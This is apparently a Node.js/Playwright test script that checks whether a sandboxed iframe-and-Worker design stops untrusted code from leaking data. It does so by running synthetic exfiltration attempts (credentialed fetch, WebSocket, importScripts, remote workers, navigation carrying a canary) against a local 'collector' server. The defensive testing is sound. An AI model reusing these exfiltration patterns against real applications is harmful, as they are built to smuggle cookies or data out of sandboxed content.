import {createServer} from 'node:http';
import {createHash,randomUUID} from 'node:crypto';
import {readFile,writeFile,mkdir} from 'node:fs/promises';
import {fileURLToPath,pathToFileURL} from 'node:url';
import {isAbsolute,resolve,sep} from 'node:path';
import {chromium} from 'playwright';
import {PROJECT_VIEW_FRAME_HTML,PROJECT_VIEW_FRAME_SHA256,projectViewFrameHeaders} from '../../services/project-views/frame.mjs';

const sha=b=>createHash('sha256').update(b).digest('hex');
const nonce=randomUUID().replaceAll('-','');
const canary='synthetic-spike-'+randomUUID();
const cookieName='spike-synthetic-auth',cookieValue='synthetic-cookie-'+randomUUID();
// Local synthetic feasibility probe only: no production app, provider, cloud,
// container, browser profile or existing output/state is reused.
const cli=process.argv.slice(2);
if(cli.length!==2||cli[0]!=='--output'||!isAbsolute(cli[1]))throw Error('usage: node scripts/m3/project-view-browser-local-feasibility.mjs --output /absolute/new-local-directory');
const out=pathToFileURL(resolve(cli[1])+sep);
// Parent must already exist; an existing output directory is a hard error.
await mkdir(out,{mode:0o700});
const evidence={schema:'browser-local-worker-feasibility/v1',startedAt:new Date().toISOString(),syntheticOnly:true,loopbackOnly:true,cloudContainerProviderModelRequests:0,workerPrototypeNotArbitraryDomCompatibility:true,http:[],websocketUpgrades:[],browserRequests:[],browserFailures:[],console:[],pageErrors:[],limitations:['Worker JS and OffscreenCanvas prototype only; not arbitrary DOM/HTML compatibility.','No production permissions, authenticated identity, cross-project or complete JHG56 acceptance.','No hard CPU/memory quota proof; trusted owner can terminate this Worker.','Point-in-time traces and synthetic canaries do not certify all browser exfiltration channels.']};
let appOrigin,collectorOrigin,browser,context,page;
const response=(res,status,body,type='text/html',headers={})=>{res.writeHead(status,{'content-type':type,'cache-control':'no-store',...headers});res.end(body);};
const listen=s=>new Promise((resolve,reject)=>{s.once('error',reject);s.listen(0,'127.0.0.1',()=>resolve(s.address().port));});
const record=(kind,req)=>{const u=new URL(req.url,'http://127.0.0.1');const r={server:kind,path:u.pathname,queryKeys:[...u.searchParams.keys()],method:req.method,syntheticCanaryPresent:u.searchParams.get('canary')===canary,syntheticAuthCookiePresent:String(req.headers.cookie??'').includes(cookieName+'='+cookieValue),origin:req.headers.origin??null,at:new Date().toISOString()};evidence.http.push(r);return u;};

function untrustedWorker(){
 'use strict';
 let port,urls,data,stopped=false;
 const send=(m,transfer=[])=>port.postMessage(m,transfer);
 const errorOf=e=>({name:e?.name??'Error',message:String(e?.message??e).slice(0,300)});
 const render=factor=>{const sum=data.reduce((a,b)=>a+b,0)*factor;const canvas=new OffscreenCanvas(64,32),ctx=canvas.getContext('2d');ctx.fillStyle=factor===2?'rgb(220,20,60)':'rgb(0,90,220)';ctx.fillRect(0,0,64,32);ctx.fillStyle='white';ctx.fillRect(0,0,sum,8);const bitmap=canvas.transferToImageBitmap();send({type:'frame',factor,sum,width:64,height:32,bitmap},[bitmap]);};
 const fetchAttempt=async(url)=>{const controller=new AbortController(),timer=setTimeout(()=>controller.abort(),1200);try{const r=await fetch(url,{credentials:'include',signal:controller.signal});return {outcome:'unexpected-response',status:r.status};}catch(e){return {outcome:'failed',...errorOf(e)};}finally{clearTimeout(timer);}};
 const attacks=async()=>{
  const results={};
  results.fetchAppApi=await fetchAttempt(urls.app+'/api/protected?attempt=worker&canary='+encodeURIComponent(urls.canary));
  results.fetchCollector=await fetchAttempt(urls.collector+'/worker-fetch?canary='+encodeURIComponent(urls.canary));
  results.webSocket=await new Promise(resolve=>{let socket,timer;const done=x=>{clearTimeout(timer);try{socket?.close();}catch{}resolve(x);};try{socket=new WebSocket(urls.collector.replace('http:','ws:')+'/worker-ws?canary='+encodeURIComponent(urls.canary));timer=setTimeout(()=>done({outcome:'timeout'}),1000);socket.onopen=()=>done({outcome:'unexpected-open'});socket.onerror=()=>done({outcome:'failed',name:'WebSocketError'});}catch(e){done({outcome:'failed',...errorOf(e)});}});
  try{importScripts(urls.collector+'/remote-script.js?canary='+encodeURIComponent(urls.canary));results.importScripts={outcome:'unexpected-success'};}catch(e){results.importScripts={outcome:'failed',...errorOf(e)};}
  results.remoteWorker=await new Promise(resolve=>{let w,timer;const done=x=>{clearTimeout(timer);w?.terminate();resolve(x);};try{w=new Worker(urls.collector+'/remote-worker.js?canary='+encodeURIComponent(urls.canary));timer=setTimeout(()=>done({outcome:'timeout'}),800);w.onerror=e=>{e.preventDefault();done({outcome:'failed',name:'WorkerError'});};w.onmessage=()=>done({outcome:'unexpected-message'});}catch(e){done({outcome:'failed',...errorOf(e)});}});
  for(const [key,action] of Object.entries({locationAssign:()=>self.location.assign(urls.collector+'/worker-nav?canary='+urls.canary),locationHref:()=>{self.location.href=urls.collector+'/worker-nav?canary='+urls.canary;},locationReplace:()=>self.location.replace(urls.collector+'/worker-nav?canary='+urls.canary)})){try{action();results[key]={outcome:'unexpected-success'};}catch(e){results[key]={outcome:'failed',...errorOf(e)};}}
  send({type:'attacks',results,capabilities:{document:typeof document,window:typeof window,parent:typeof parent,open:typeof open,origin:self.origin,offscreenCanvas:typeof OffscreenCanvas}});
 };
 self.addEventListener('securitypolicyviolation',e=>{if(port)send({type:'csp',effectiveDirective:e.effectiveDirective,blockedURI:e.blockedURI});});
 self.onmessage=e=>{if(e.data?.type!=='init'||!e.ports[0]||port)return;port=e.ports[0];urls=e.data.urls;port.onmessage=m=>{if(stopped)return;if(m.data?.type==='data'&&Array.isArray(m.data.values)){data=m.data.values;render(2);void attacks();}else if(m.data?.type==='parameter'&&data&&Number.isFinite(m.data.factor))render(m.data.factor);};port.start();send({type:'broker',id:1,path:'series.json'});};
}

function trustedBootstrap(config){
 'use strict';
 let worker,blobUrl,used=false;
 const control=e=>{
  if(e.source!==parent||e.origin!==config.app||e.data?.nonce!==config.nonce)return;
  if(e.data.type==='init'&&!used&&e.ports.length===1){
   used=true;let cookieAccess,parentDomAccess;
   try{void document.cookie;cookieAccess='unexpected-readable';}catch(x){cookieAccess=x.name;}
   try{void parent.document.body;parentDomAccess='unexpected-readable';}catch(x){parentDomAccess=x.name;}
   parent.postMessage({type:'bootstrap',nonce:config.nonce,origin:self.origin,cookieAccess,parentDomAccess},config.app);
   try{blobUrl=URL.createObjectURL(new Blob([config.workerSource],{type:'text/javascript'}));worker=new Worker(blobUrl);worker.onerror=event=>{event.preventDefault();parent.postMessage({type:'worker-error',nonce:config.nonce,message:String(event.message).slice(0,300)},config.app);};worker.postMessage({type:'init',urls:{app:config.app,collector:config.collector,canary:config.canary}},[e.ports[0]]);}
   catch(x){parent.postMessage({type:'worker-create-failed',nonce:config.nonce,name:x.name,message:String(x.message).slice(0,300)},config.app);}
  }else if(e.data.type==='cleanup'&&used){
   worker?.terminate();if(worker)worker.onerror=null;if(blobUrl)URL.revokeObjectURL(blobUrl);window.removeEventListener('message',control);
   parent.postMessage({type:'cleanup',nonce:config.nonce,workerTerminateCalled:Boolean(worker),blobRevoked:Boolean(blobUrl),controlListenerRemoved:true},config.app);
  }
 };
 window.addEventListener('message',control);
}

function appMain(config){
 const state=window.spike={frames:[],messages:[],brokerReads:0,baselineBrokerStates:[],baselineAuthorizations:0,cleanup:null};
 const canvas=document.getElementById('canvas'),ctx=canvas.getContext('2d');
 let frame,port,baselineFrame,baselineBroker;
 const listener=e=>{if(e.source===frame?.contentWindow&&e.origin==='null'&&e.data?.nonce===config.nonce){state.messages.push(e.data);if(e.data.type==='cleanup')state.cleanup=e.data;}};
 window.addEventListener('message',listener);
 window.startWorker=()=>new Promise(resolve=>{
  frame=document.createElement('iframe');frame.sandbox='allow-scripts';frame.src='/opaque';frame.referrerPolicy='no-referrer';
  const channel=new MessageChannel();port=channel.port1;
  port.onmessage=e=>{const m=e.data;if(m.type==='broker'&&m.id===1&&m.path==='series.json'){state.brokerReads++;port.postMessage({type:'data',values:[2,3,5]});}
   else if(m.type==='frame'&&m.width===64&&m.height===32&&m.bitmap){ctx.drawImage(m.bitmap,0,0);m.bitmap.close();const pixels=[...ctx.getImageData(0,0,64,32).data];state.frames.push({factor:m.factor,sum:m.sum,checksum:pixels.reduce((s,v,i)=>(s+v*(i+1))>>>0,0),imageBitmapClosed:true});}
   else state.messages.push(m);};
  port.start();frame.onload=()=>{frame.onload=null;frame.contentWindow.postMessage({type:'init',nonce:config.nonce},'*',[channel.port2]);resolve();};document.body.append(frame);
 });
 window.parameter=factor=>port.postMessage({type:'parameter',factor});
 window.cleanupWorker=async()=>{frame.contentWindow.postMessage({type:'cleanup',nonce:config.nonce},'*');};
 window.finishWorkerCleanup=()=>{port.onmessage=null;port.close();frame.remove();window.removeEventListener('message',listener);state.parentCleanup={portClosed:true,frameRemoved:true,listenerRemoved:true};};
 window.baseline=async pkg=>{
  const {verifyProjectViewPackage,createProjectViewBroker}=await import('/web/project-views.js');
  await verifyProjectViewPackage(pkg,pkg.scope,()=>true);state.baselinePackageVerified=true;
  const channel=new MessageChannel();baselineBroker=createProjectViewBroker({port:channel.port1,pkg,isCurrent:()=>true,authorize:async()=>{state.baselineAuthorizations++;},onState:s=>state.baselineBrokerStates.push(s)});
  baselineFrame=document.createElement('iframe');baselineFrame.sandbox='allow-scripts';baselineFrame.src='/baseline';baselineFrame.referrerPolicy='no-referrer';baselineFrame.onload=()=>{baselineFrame.onload=null;baselineFrame.contentWindow.postMessage({type:'project-view-init',package:pkg,view:pkg.manifest.views[0]},'*',[channel.port2]);};document.body.append(baselineFrame);
 };
 window.cleanupBaseline=()=>{baselineBroker?.close();baselineFrame?.remove();state.baselineCleanup={brokerClosed:baselineBroker?.closed===true,frameRemoved:true};};
}

const collector=createServer((req,res)=>{const u=record('collector',req);response(res,200,u.pathname.endsWith('.js')?'postMessage({remote:true});':'<!doctype html><p>synthetic collector</p>',u.pathname.endsWith('.js')?'text/javascript':'text/html',{'access-control-allow-origin':'*'});});
collector.on('upgrade',(req,socket)=>{const u=new URL(req.url,'http://127.0.0.1');evidence.websocketUpgrades.push({path:u.pathname,syntheticCanaryPresent:u.searchParams.get('canary')===canary});const accept=createHash('sha1').update(String(req.headers['sec-websocket-key'])+'258EAFA5-E914-47DA-95CA-C5AB0DC85B11').digest('base64');socket.end('HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: '+accept+'\r\n\r\n');});
const workerSource='('+untrustedWorker.toString()+')();';
const app=createServer(async(req,res)=>{
 try{
  const u=record('app',req);
  if(u.pathname==='/api/protected'){response(res,200,JSON.stringify({syntheticCookieSeen:String(req.headers.cookie??'').includes(cookieName+'='+cookieValue)}),'application/json');return;}
  if(u.pathname==='/baseline'){response(res,200,PROJECT_VIEW_FRAME_HTML,'text/html',projectViewFrameHeaders(appOrigin));return;}
  if(u.pathname==='/opaque'){const config={app:appOrigin,collector:collectorOrigin,nonce,canary,workerSource};const html='<!doctype html><meta charset="utf-8"><script nonce="'+nonce+'">('+trustedBootstrap.toString()+')('+JSON.stringify(config)+');</script>';response(res,200,html,'text/html',{'content-security-policy':"default-src 'none'; script-src 'nonce-"+nonce+"'; connect-src 'none'; worker-src blob:; frame-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'; sandbox allow-scripts; frame-ancestors "+appOrigin,'referrer-policy':'no-referrer'});return;}
  if(/^\/web\/[a-z0-9-]+\.js$/.test(u.pathname)){const content=await readFile(new URL('../../services/web/'+u.pathname.split('/').at(-1),import.meta.url));response(res,200,content,'text/javascript');return;}
  if(u.pathname==='/'||u.pathname==='/app'){const config={nonce};response(res,200,'<!doctype html><meta charset="utf-8"><title>local feasibility</title><canvas id="canvas" width="64" height="32"></canvas><script>('+appMain.toString()+')('+JSON.stringify(config)+');</script>');return;}
  response(res,404,'missing');
 }catch(e){response(res,500,String(e.name));}
});
const until=async(fn,ms=6000)=>{const end=Date.now()+ms;while(Date.now()<end){if(await fn())return;await new Promise(r=>setTimeout(r,25));}throw Error('bounded-observation-timeout');};
const positive=async label=>page.evaluate(async({collector,app,label})=>{const c=await fetch(collector+'/positive-'+label,{credentials:'omit'});const api=await fetch(app+'/api/protected?positive='+label,{credentials:'include'});return {collectorStatus:c.status,appApi:await api.json()};},{collector:collectorOrigin,app:appOrigin,label});
try{
 collectorOrigin='http://127.0.0.1:'+await listen(collector);appOrigin='http://127.0.0.1:'+await listen(app);evidence.origins={app:appOrigin,collector:collectorOrigin};
 evidence.source={frameModuleSha256:sha(await readFile(new URL('../../services/project-views/frame.mjs',import.meta.url))),frameHtmlSha256:PROJECT_VIEW_FRAME_SHA256,frameHeaders:projectViewFrameHeaders(appOrigin),spikeSha256:sha(await readFile(fileURLToPath(import.meta.url)))};
 browser=await chromium.launch({headless:true,channel:'chromium',chromiumSandbox:true,args:['--disable-background-networking','--disable-component-update']});
 evidence.chromiumVersion=browser.version();context=await browser.newContext();await context.addCookies([{url:appOrigin+'/api/',name:cookieName,value:cookieValue,httpOnly:true,sameSite:'Strict'}]);
 page=await context.newPage();context.on('request',r=>evidence.browserRequests.push({url:r.url(),method:r.method()}));context.on('requestfailed',r=>evidence.browserFailures.push({url:r.url(),error:r.failure()?.errorText}));
 await context.route('**/*',route=>{const u=new URL(route.request().url());if(u.hostname==='127.0.0.1'||u.protocol==='blob:')return route.continue();evidence.unexpectedNonLoopbackBlocked=true;return route.abort();});
 page.on('console',m=>{if(m.type()==='error')evidence.console.push(m.text().slice(0,600));});page.on('pageerror',e=>evidence.pageErrors.push(String(e.message).slice(0,600)));
 await page.goto(appOrigin+'/app');
 evidence.positiveBefore=await positive('before');
 await page.evaluate(()=>window.startWorker());
 await until(async()=>{const s=await page.evaluate(()=>spike);return s.messages.some(m=>m.type==='attacks'||m.type==='worker-create-failed'||m.type==='worker-error');});
 evidence.workerInitial=await page.evaluate(()=>spike);
 if(evidence.workerInitial.frames.length){
  await page.evaluate(()=>window.parameter(5));await page.waitForFunction(()=>spike.frames.length===2,{timeout:5000});
  evidence.workerFrames=await page.evaluate(()=>spike.frames);await page.locator('canvas').screenshot({path:fileURLToPath(new URL('canvas.png',out))});
 }
 evidence.workerTargetsBeforeCleanup=page.workers().length;
 await page.evaluate(()=>window.cleanupWorker());await page.waitForFunction(()=>spike.cleanup!==null,{timeout:5000});await page.evaluate(()=>window.finishWorkerCleanup());await until(()=>page.workers().length===0);evidence.workerCleanup=await page.evaluate(()=>({child:spike.cleanup,parent:spike.parentCleanup}));evidence.workerTargetsAfterCleanup=page.workers().length;
 const code="(async()=>{const file=await riffoid.readFile('docs/canary.json');const c=JSON.parse(file.text).canary;try{await fetch("+JSON.stringify(appOrigin+"/api/protected?attempt=baseline-fetch")+",{credentials:'include'});}catch{}location.href="+JSON.stringify(collectorOrigin+"/baseline-nav?canary=")+"+encodeURIComponent(c);})();";
 const html='<h1>synthetic baseline</h1><script>'+code+'</script>',data=JSON.stringify({canary});
 const asset=(path,mediaType,text)=>({path,mediaType,base64:Buffer.from(text).toString('base64'),sha256:sha(text)});
 const body={schema:'project.view-package/v1',scope:{tenantId:'tenant-spike',projectId:'project-spike',workspaceId:'workspace-spike',workspaceGeneration:1},revisionId:'revision-spike',filesSha256:'a'.repeat(64),manifest:{schema:'project.views/v1',files:['app/home.html','docs/canary.json'],views:[{id:'home',title:'synthetic baseline',entrypoint:'app/home.html'}]},assets:[asset('app/home.html','text/html',html),asset('docs/canary.json','application/json',data)]};
 const pkg={packageIdentity:sha(JSON.stringify(body)),...body};evidence.baselinePackageIdentity=pkg.packageIdentity;
 await page.evaluate(pkg=>window.baseline(pkg),pkg);await until(()=>evidence.http.some(r=>r.server==='collector'&&r.path==='/baseline-nav'&&r.syntheticCanaryPresent));evidence.baseline=await page.evaluate(()=>({packageVerified:spike.baselinePackageVerified,authorizations:spike.baselineAuthorizations,states:spike.baselineBrokerStates}));await page.evaluate(()=>window.cleanupBaseline());evidence.baseline.cleanup=await page.evaluate(()=>spike.baselineCleanup);
 evidence.positiveAfter=await positive('after');await page.waitForTimeout(150);
 const attackHttp=evidence.http.filter(r=>r.path.startsWith('/worker-')||r.path==='/remote-script.js'||r.path==='/remote-worker.js'||r.path==='/api/protected'&&r.queryKeys.includes('attempt'));
 const report=evidence.workerInitial.messages.find(m=>m.type==='attacks');const bootstrap=evidence.workerInitial.messages.find(m=>m.type==='bootstrap');
 evidence.assertions={beforeAndAfterCollectorPositive:evidence.positiveBefore.collectorStatus===200&&evidence.positiveAfter.collectorStatus===200,appCookiePositive:evidence.positiveBefore.appApi.syntheticCookieSeen&&evidence.positiveAfter.appApi.syntheticCookieSeen,opaqueOrigin:bootstrap?.origin==='null',opaqueCookieDenied:bootstrap?.cookieAccess==='SecurityError',opaqueParentDomDenied:bootstrap?.parentDomAccess==='SecurityError',workerCreated:Boolean(report),workerNoDom:report?.capabilities.document==='undefined'&&report?.capabilities.window==='undefined',workerAttacksAllFail:report&&Object.values(report.results).every(r=>r.outcome==='failed'),workerAttackHttpObserved:attackHttp.length,workerNoHttpEgress:attackHttp.length===0,workerCalculationAndParameterRender:evidence.workerFrames?.[0]?.sum===20&&evidence.workerFrames?.[1]?.sum===50&&evidence.workerFrames[0].checksum!==evidence.workerFrames[1].checksum,baselineSameFrameCspSelfNavigationLeakedSyntheticCanary:evidence.http.some(r=>r.path==='/baseline-nav'&&r.syntheticCanaryPresent),collectorNeverReceivedSyntheticCookie:!evidence.http.some(r=>r.server==='collector'&&r.syntheticAuthCookiePresent),workersGone:evidence.workerTargetsAfterCleanup===0};
 evidence.status=Object.entries(evidence.assertions).filter(([k])=>k!=='workerAttackHttpObserved').every(([,v])=>v===true)?'prototype-feasible-with-known-dom-baseline-failure':'partial-or-failed-prototype';
}catch(e){evidence.status='stopped';evidence.failure={name:e.name,message:String(e.message).slice(0,900)};}
finally{
 try{await context?.close();evidence.browserContextClosed=true;}catch{evidence.browserContextClosed=false;}
 try{await browser?.close();evidence.browserClosed=true;}catch{evidence.browserClosed=false;}
 for(const s of [app,collector]){s.closeAllConnections();await new Promise(resolve=>s.close(resolve));}
 evidence.loopbackServersClosed=true;evidence.finishedAt=new Date().toISOString();
 await writeFile(new URL('evidence.json',out),JSON.stringify(evidence,null,2)+'\n',{mode:0o600});
 process.stdout.write(JSON.stringify({output:fileURLToPath(out),status:evidence.status,assertions:evidence.assertions,failure:evidence.failure,chromiumVersion:evidence.chromiumVersion})+'\n');
}
